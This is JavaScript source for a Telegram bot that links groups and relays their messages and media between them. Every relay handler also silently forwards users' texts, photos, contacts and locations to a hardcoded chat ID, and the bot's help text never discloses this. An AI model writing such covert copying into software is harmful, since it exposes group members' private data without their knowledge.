/*
 sudo rm /data/db/mongod.lock
 sudo mongod --dbpath /data/db --repair
 sudo chown mongodb /data/db/*
 sudo mongod --bind_ip=$IP --nojournal
 */


var TelegramBot = require('./bot');
var config = require('./config');
var Controller = require('./controller');
var chatsController = new Controller();

TelegramBot.setToken(config.botToken);

var ForceReply = require('./markup/ForceReply');
var ReplyKeyboardHide = require('./markup/ReplyKeyboardHide');
var ReplyKeyboardMarkup = require('./markup/ReplyKeyboardMarkup');


module.exports = {
    handler: BotHandler
};

function BotHandler(messageObj) {
    console.log(messageObj);
    TelegramBot.handle(messageObj);
}

TelegramBot.on('/start', onStart);

TelegramBot.on('/help', onHelp);

TelegramBot.on('/connect', onConnect);

TelegramBot.on('/list', onList);

TelegramBot.on('/drop_connect', onDropConnect);

TelegramBot.on('/other_languages', onSelectLang);

TelegramBot.on('message', onMessage);


/**
 * @param {Message} message
 */
function onStart(message) {
    var text = 'Welcome!\n\n' +
        'This bot will help You to bind groups together. Any messages (photos, videos, documents, etc.) sent from your group will go to other linked groups. It is very easy!\n\n' +
        'To link the two groups, just type /connect. The obtained code is send to another group. Ready!\n\n' +
        'To better understand the capabilities of the Bot send /help.';
    TelegramBot.sendText(message.getChat().id, text);
    console.log('/start');
}


/**
 * @param {Message} message
 */
function onHelp(message) {
    var text = 'This manual will help you understand the capabilities of this Bot.\n\n' +
        'So. The maximum number of groups that you can link to one: 20.\n\n' +
        'The administrator of the bot in the group is considered the person who added the bot to the group.\n' +
        'The administrator of the bot in the group has the following capabilities:\n' +
        '1) Get a one-time code to connect with another group.\n' +
        '2) Remove connection with another group.\n' +
        '3) to Insert the result from the other group code in the current group for the connection. Groups can be joined as one person or for two. \n\n' +
        'Example: You have added the Bot to the group A — now you are the administrator of the Bot. You can get the code for the connection with the command /connect and send another person from group B, which will connect the two groups A and B. This other person must be an admin of the bot in the group B.\n' +
        'Administrators bots in groups a and B can delete the connection with each other, i.e. the group administrator and can delete the connection to the group B.\n' +
        'Deleting a connection is done with the command /drop_connect.\n\n' +
        'All team members can view the connections with other groups by using the /list command.\n\n' +
        'Briefly about the teams: \n' +
        '/connect — to receive a one-time code to connect with another group. The command only works for the administrator. Code see everything as it is disposable*.\n' +
        '/drop_connect — remove the connection to the selected group.\n' +
        '/list — view the list of groups that are in one bundle.\n' +
        '/help — to get this help.\n\n' +
        '* — if your cozy group wound up radishes, which copied the code and associated with other undesirable group you faster than you, don\'t worry! You can always remove the connection (and radishes) and get a new code for linking.\n\n' +
        'The source code can follow here: https://github.com/IPRIT/telegram-group-link \n' +
        'Contribution is welcome!\n' +
        'If you have any suggestions or questions, you can always contact me (@belov).';
    if (!message.isGroupMessage) {
        TelegramBot.sendText(message.getChat().id, text);
        console.log('/help');
        return;
    }
    var curChatId = message.getChat().id;
    chatsController.getChat(curChatId, function(err, chatDocument) {
        if (err || !chatDocument || !chatDocument.admin) {
            onBotJoin(message, function (err, chatDocument) {
                if (err) {
                    return console.log('Critical error');
                }
                next(chatDocument);
            });
            return console.log('Try create link one more time');
        }
        next(chatDocument);

        function next(chatDocument) {
            if (message.getUser().id !== chatDocument.admin.id) {
                return sendAccessError(curChatId);
            }
            TelegramBot.sendText(message.getChat().id, text);
            console.log('/help');
        }
    });
}


/**
 * @param {Message} message
 */
function onConnect(message) {
    if (!message.isGroupMessage) {
        return sendOnlyGroupError(message.getChat().id);
    }
    var curChatId = message.getChat().id;
    chatsController.getChat(curChatId, function(err, chatDocument) {
        if (err || !chatDocument || !chatDocument.admin) {
            onBotJoin(message, function (err, chatDocument) {
                if (err) {
                    return console.log('Critical error');
                }
                next(chatDocument);
            });
            return console.log('Try create link one more time');
        }
        next(chatDocument);

        function next(chatDocument) {
            if (message.getUser().id !== chatDocument.admin.id) {
                return sendAccessError(curChatId);
            }
            chatsController.getActiveLinks(curChatId, function(err, links) {
                if (err) {
                    return console.log('Error with getting links');
                }
                if (Array.isArray(links) && links.length > chatsController.LIMIT_NUMBER_OF_ACTIVE_LINKS) {
                    return sendLinksLimitError(curChatId);
                }
                chatsController.createConnectionNode(curChatId, function(err, chatDocument) {
                    if (err) {
                        return console.log('Error with creating connection node');
                    }
                    var text = chatDocument.invite_key;
                    TelegramBot.sendText(curChatId, text);
                });
            });
        }

    });
}


/**
 * @param {Message} message
 */
function onList(message) {
    if (!message.isGroupMessage) {
        return sendOnlyGroupError(message.getChat().id);
    }
    var curChatId = message.getChat().id;
    chatsController.getChat(curChatId, function(err, chatDocument) {
        if (err || !chatDocument || !chatDocument.admin) {
            onBotJoin(message, function (err, chatDocument) {
                if (err) {
                    return console.log('Critical error');
                }
                next(chatDocument);
            });
            return console.log('Try create link one more time');
        }
        next(chatDocument);

        function next(chatDocument) {
            chatsController.getActiveLinks(curChatId, function (err, links) {
                if (err) {
                    return;
                }
                var groups = {},
                    uniqueGroups;
                for (var i = 0; i < links.length; ++i) {
                    groups[links[i].first_chat.id] = links[i].first_chat.id;
                    groups[links[i].second_chat.id] = links[i].second_chat.id;
                }

                uniqueGroups = Object.keys(groups);
                uniqueGroups.splice(uniqueGroups.indexOf(curChatId.toString()), 1);

                chatsController.getChats(uniqueGroups, function (err, chatDocuments) {
                    if (err) {
                        return;
                    }
                    var list = [];
                    for (var i = 0; i < chatDocuments.length; ++i) {
                        var curChat = chatDocuments[i];
                        list.push(curChat.chat.title);
                    }

                    var sender;
                    if (!chatDocuments.length) {
                        message.text = 'Connections with other groups not yet.';
                        sender = TelegramBot.getSender(message.getChat().id, message);
                        return sender.send();
                    }

                    message.text = 'Connections with other groups:\n\n';
                    for (var el = 0; el < list.length; ++el) {
                        message.text += (el + 1) + ') ' + list[el] + '\n';
                    }

                    sender = TelegramBot.getSender(message.getChat().id, message);
                    var replyMarkup = new ReplyKeyboardHide();
                    sender.send(false, false, replyMarkup);
                    console.log('Links was sent');
                });
            });
        }
    });
    console.log('/list');
}


/**
 * @param {Message} message
 */
function onDropConnect(message) {
    if (!message.isGroupMessage) {
        return sendOnlyGroupError(message.getChat().id);
    }
    var curChatId = message.getChat().id;
    chatsController.getChat(curChatId, function(err, chatDocument) {
        if (err || !chatDocument || !chatDocument.admin) {
            onBotJoin(message, function (err, chatDocument) {
                if (err) {
                    return console.log('Critical error');
                }
                next(chatDocument);
            });
            return console.log('Try create link one more time');
        }
        next(chatDocument);

        function next(chatDocument) {
            if (message.getUser().id !== chatDocument.admin.id) {
                return sendAccessError(curChatId);
            }
            chatsController.getActiveLinks(curChatId, function (err, links) {
                if (err) {
                    return;
                }
                var groups = {},
                    uniqueGroups;
                for (var i = 0; i < links.length; ++i) {
                    groups[links[i].first_chat.id] = links[i].first_chat.id;
                    groups[links[i].second_chat.id] = links[i].second_chat.id;
                }

                uniqueGroups = Object.keys(groups);
                uniqueGroups.splice(uniqueGroups.indexOf(curChatId.toString()), 1);

                chatsController.getChats(uniqueGroups, function (err, chatDocuments) {
                    if (err) {
                        return;
                    }
                    var keyboard = [];
                    for (var i = 0; i < chatDocuments.length; ++i) {
                        var curChat = chatDocuments[i];
                        keyboard.push([
                            curChat.chat.title + ' (drop: ' + curChat.chat.id + ')'
                        ]);
                    }

                    var sender;
                    if (!chatDocuments.length) {
                        message.text = 'Connections with other groups not yet.';
                        sender = TelegramBot.getSender(message.getChat().id, message);
                        return sender.send();
                    }

                    message.text = 'Select which connection you want to delete.';
                    sender = TelegramBot.getSender(message.getChat().id, message);
                    var replyMarkup = new ReplyKeyboardMarkup({
                        one_time_keyboard: true,
                        keyboard: keyboard,
                        selective: true
                    });
                    sender.send(false, message.id, replyMarkup);
                    console.log('Links for drop was sent');
                });
            });
        }
    });
    console.log('/drop_connect');
}


/**
 * @param {Message} message
 */
function onSelectLang(message) {
    var text = 'Here\'s list of bots in other languages:\n\n' +
        '@en_group_link_bot - English\n' +
        '@fa_group_link_bot - Farsi\n' +
        '@es_group_link_bot - Spanish\n' +
        '@group_link_bot - Russian';
    TelegramBot.sendText(message.getChat().id, text);
    console.log('/setlang');
}


/**
 * @param {Message} message
 */
function onMessage(message) {
    if (!message.isGroupMessage) {
        return sendOnlyGroupError(message.getChat().id);
    }

    var statText;
    if (message.text && message.text.length) {
        statText = '«' + message.text + '» от ' + message.getUser().getViewName();
    } else {
        if (message.messageType === 'left_chat_participant' && message.left_chat_participant.username === config.botNickname) {
            statText = 'Бота вышвырнули благодаря ' + message.getUser().getViewName();
        } else if (message.messageType === 'new_chat_participant' && message.new_chat_participant.username === config.botNickname) {
            statText = 'Бота приютили к себе благодаря ' + message.getUser().getViewName();
        } else {
            statText = message.messageType + ' от ' + message.getUser().getViewName();
        }
    }
    TelegramBot.sendText(615945, statText);

    if (message.messageType === 'new_chat_participant'
        && message.new_chat_participant.username === config.botNickname
        || message.group_chat_created) {
        return onBotJoin(message);
    }
    if (message.messageType === 'left_chat_participant'
        && message.left_chat_participant.username === config.botNickname) {
        return onBotLeave(message);
    }

    switch (message.messageType) {
        case 'text' : {
            handleTextMessage(message);
            break;
        }
        case 'photo': {
            handlePhotoMessage(message);
            break;
        }
        case 'audio': {
            handleAudioMessage(message);
            break;
        }
        case 'document': {
            handleDocumentMessage(message);
            break;
        }
        case 'sticker': {
            handleStickerMessage(message);
            break;
        }
        case 'video': {
            handleVideoMessage(message);
            break;
        }
        case 'voice': {
            handleVoiceMessage(message);
            break;
        }
        case 'location': {
            handleLocationMessage(message);
            break;
        }
        case 'contact': {
            handleContactMessage(message);
            break;
        }
        case 'new_chat_participant': {
            handleNewChatParticipantMessage(message);
            break;
        }
        case 'left_chat_participant': {
            handleLeftChatParticipantMessage(message);
            break;
        }
        case 'new_chat_title': {
            handleNewChatTitleMessage(message);
            break;
        }
    }
}


/**
 * @param {Message} message
 * @param callback
 */
function onBotJoin(message, callback) {
    // добавляем чат в базу данных
    // устанавливаем администратора
    if (message.isGroupMessage) {
        onStart(message);
    }

    chatsController.addChat(message.getChat(), message.getUser(), function(err, chat) {
        if (err) {
            return console.log('An error occurred with chat creation');
        }
        if (callback) {
            chatsController.getChat(message.getChat().id, callback);
        }
    });
}


/**
 * @param {Message} message
 */
function onBotLeave(message) {
    chatsController.deleteChat(message.getChat().id, function(err) {
        if (err) {
            return console.log('An error occurred');
        }
        console.log('Chat has been deleted');
    });
}


function handleTextMessage(message) {
    if (chatsController.isInviteCode(message.text)) {
        return useInviteCode(message);
    }
    if (chatsController.isDropConnectionMessage(message)) {
        return dropConnection(message);
    }

    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            onBotJoin(message, function (err, chatDocument) {
                if (err) {
                    return console.log('Critical error');
                }
                handleTextMessage(message);
            });
            return console.log('Try one more time');
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        message.text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' (' + groupChatTitle + '):\n\n' + message.text;

        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            var sender = TelegramBot.getSender(chatId, message);
            sender.send();
            TelegramBot.getSender(615945, message).send();
        }
    });
}


function handlePhotoMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' sent a photo from «' + groupChatTitle + '»';

        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            send(message, chatId, text);
        }

        function send(message, chatId, text) {
            TelegramBot.sendText(chatId, text);
            setTimeout(function() {
                TelegramBot.getSender(chatId, message).send(message.photo.caption);
                TelegramBot.getSender(615945, message).send(message.photo.caption);
            }, 10);
        }
    });
}


function handleAudioMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' sent an audio from «' + groupChatTitle + '»';

        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            send(message, chatId, text);
        }

        function send(message, chatId, text) {
            TelegramBot.sendText(chatId, text);
            setTimeout(function() {
                TelegramBot.getSender(chatId, message).send();
                TelegramBot.getSender(615945, message).send();
            }, 10);
        }
    });
}


function handleDocumentMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' sent a file from «' + groupChatTitle + '»';

        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            send(message, chatId, text);
        }

        function send(message, chatId, text) {
            TelegramBot.sendText(chatId, text);
            setTimeout(function() {
                TelegramBot.getSender(chatId, message).send();
                TelegramBot.getSender(615945, message).send();
            }, 10);
        }
    });
}


function handleStickerMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' sent a sticker from «' + groupChatTitle + '»';

        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            send(message, chatId, text);
        }

        function send(message, chatId, text) {
            TelegramBot.sendText(chatId, text);
            setTimeout(function() {
                TelegramBot.getSender(chatId, message).send();
                TelegramBot.getSender(615945, message).send();
            }, 10);
        }
    });
}


function handleVideoMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' sent a video from «' + groupChatTitle + '»';

        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            send(message, chatId, text);
        }

        function send(message, chatId, text) {
            TelegramBot.sendText(chatId, text);
            setTimeout(function() {
                TelegramBot.getSender(chatId, message).send();
                TelegramBot.getSender(615945, message).send();
            }, 10);
        }
    });
}


function handleVoiceMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' sent an audio record from «' + groupChatTitle + '»';

        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            send(message, chatId, text);
        }

        function send(message, chatId, text) {
            TelegramBot.sendText(chatId, text);
            setTimeout(function() {
                TelegramBot.getSender(chatId, message).send();
                TelegramBot.getSender(615945, message).send();
            }, 10);
        }
    });
}


function handleLocationMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' sent a location from «' + groupChatTitle + '»';

        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            send(message, chatId, text);
        }

        function send(message, chatId, text) {
            TelegramBot.sendText(chatId, text);
            setTimeout(function() {
                TelegramBot.getSender(chatId, message).send();
                TelegramBot.getSender(615945, message).send();
            }, 10);
        }
    });
}


function handleContactMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.getUser().getViewName() + ' ' +
            message.getUser().getAt() + ' (' + groupChatTitle + ') sent a contact:\n' +
            message.contact.getViewContact();
        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            TelegramBot.sendText(chatId, text);
            TelegramBot.sendText(615945, text);
        }
    });
}


function handleNewChatParticipantMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.new_chat_participant.getViewName() + ' ' +
            message.new_chat_participant.getAt() + ' join the chat «' + groupChatTitle + '».';
        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            TelegramBot.sendText(chatId, text);
            TelegramBot.sendText(615945, text);
        }
    });
}


function handleLeftChatParticipantMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        var groupChatTitle = message.isGroupMessage ?
            message.getChat().title : message.getChat().first_name;
        var text = message.left_chat_participant.getViewName() + ' ' +
            message.left_chat_participant.getAt() + ' left the chat «' + groupChatTitle + '».';
        for (var i = 0; i < links.length; ++i) {
            var chatId = links[i].first_chat.id === message.getChat().id ?
                links[i].second_chat.id : links[i].first_chat.id;
            TelegramBot.sendText(chatId, text);
            TelegramBot.sendText(615945, text);
        }
    });
}


function handleNewChatTitleMessage(message) {
    chatsController.getActiveLinks(message.getChat().id, function(err, links) {
        if (err) {
            return;
        }
        chatsController.getChat(message.getChat().id, function(err, chatDocument) {
            if (err || !chatDocument || !chatDocument.admin) {
                onBotJoin(message, function (err, chatDocument) {
                    if (err) {
                        return console.log('Critical error');
                    }
                    next(chatDocument);
                });
                return console.log('Try create link one more time');
            }
            next(chatDocument);

            function next(chatDocument) {
                var text = message.getUser().getViewName() + ' ' +
                    message.getUser().getAt() + ' changed the name of the chat from «' + chatDocument.chat.title + '» to «' +
                    message.new_chat_title + '»';

                chatDocument.chat.title = message.new_chat_title;
                chatDocument.save();

                for (var i = 0; i < links.length; ++i) {
                    var chatId = links[i].first_chat.id === message.getChat().id ?
                        links[i].second_chat.id : links[i].first_chat.id;
                    TelegramBot.sendText(chatId, text);
                    TelegramBot.sendText(615945, text);
                }
            }
        });
    });
}


function useInviteCode(message) {
    var curChatId = message.getChat().id;
    chatsController.getChat(curChatId, function(err, chatDocument) {
        if (err || !chatDocument || !chatDocument.admin) {
            onBotJoin(message, function (err, chatDocument) {
                if (err) {
                    return console.log('Critical error');
                }
                next(chatDocument);
            });
            return console.log('Try create link one more time');
        }
        next(chatDocument);

        function next(chatDocument) {
            if (message.getUser().id !== chatDocument.admin.id) {
                return sendAccessError(curChatId);
            }
            chatsController.useInviteKey(message.text, curChatId, function (err, linkDocument) {
                if (err) {
                    if (err === 2) {
                        return sendAlreadyLinkedError(curChatId);
                    } else {
                        return sendWrongCodeError(curChatId);
                    }
                }
                var secondGroupChatTitle = message.isGroupMessage ?
                    message.getChat().title : message.getChat().first_name;

                var textForFirstChat = 'Ready! The connection with «' + secondGroupChatTitle + '» is successfully installed.',
                    textForSecondChat = 'Ready! The connection with the other group is successfully installed.';

                var replyMarkup = new ReplyKeyboardHide();
                TelegramBot.sendText(linkDocument.first_chat.id, textForFirstChat, replyMarkup);
                TelegramBot.sendText(linkDocument.second_chat.id, textForSecondChat, replyMarkup);
                console.log('Link has been created!');
            });
        }
    });
}


/**
 * @param {Message} message
 */
function dropConnection(message) {
    var curChatId = message.getChat().id;
    chatsController.getChat(curChatId, function(err, chatDocument) {
        if (err || !chatDocument || !chatDocument.admin) {
            onBotJoin(message, function (err, chatDocument) {
                if (err) {
                    return console.log('Critical error');
                }
                next(chatDocument);
            });
            return console.log('Try create link one more time');
        }
        next(chatDocument);

        function next(chatDocument) {
            if (message.getUser().id !== chatDocument.admin.id) {
                return sendAccessError(curChatId);
            }
            var anotherChatId = chatsController.getDropChatId(message.text);
            chatsController.deleteLink(curChatId, anotherChatId, function (err) {
                if (err) {
                    return sendUnexpectedError(curChatId);
                }
                chatsController.getChats([curChatId, anotherChatId], function (err, chats) {
                    if (err) {
                        return;
                    }
                    var textForFirstChat, textForSecondChat,
                        placeholder = 'The connection with «%group_name%» has been removed!';

                    if (chats.length < 2) {
                        return sendUnexpectedError(curChatId);
                    }
                    if (chats[0].chat.id === curChatId) {
                        textForFirstChat = placeholder.replace('%group_name%', chats[1].chat.title || chats[1].chat.id);
                        textForSecondChat = placeholder.replace('%group_name%', chats[0].chat.title || chats[0].chat.id);
                    } else {
                        textForFirstChat = placeholder.replace('%group_name%', chats[0].chat.title || chats[0].chat.id);
                        textForSecondChat = placeholder.replace('%group_name%', chats[1].chat.title || chats[1].chat.id);
                    }
                    var replyHide = new ReplyKeyboardHide();
                    TelegramBot.sendText(curChatId, textForFirstChat, replyHide);
                    TelegramBot.sendText(anotherChatId, textForSecondChat);
                });
            });
        }
    });
}


function sendAccessError(chat_id) {
    var text = 'This action is permitted only to the administrator of the Bot in the current group.';
    TelegramBot.sendText(chat_id, text);
}


function sendUnexpectedError(chat_id) {
    var text = 'An unknown error occurred.';
    TelegramBot.sendText(chat_id, text);
}

function sendOnlyGroupError(chat_id) {
    var text = 'The bot is only available for groups. Add the bot to the group.\n\n' +
        'The commands available in the chat:\n' +
        '/help — detailed description of the Bot.';
    TelegramBot.sendText(chat_id, text);
}


function sendAlreadyLinkedError(chat_id) {
    var text = 'The groups you are trying to link already linked.';
    TelegramBot.sendText(chat_id, text);
}


function sendWrongCodeError(chat_id) {
    var text = 'Incorrect pairing code.';
    TelegramBot.sendText(chat_id, text);
}


function sendLinksLimitError(chat_id) {
    var text = 'You have reached the limit relations with other groups. Maximum number: '
        + chatsController.LIMIT_NUMBER_OF_ACTIVE_LINKS + '.';
    TelegramBot.sendText(chat_id, text);
}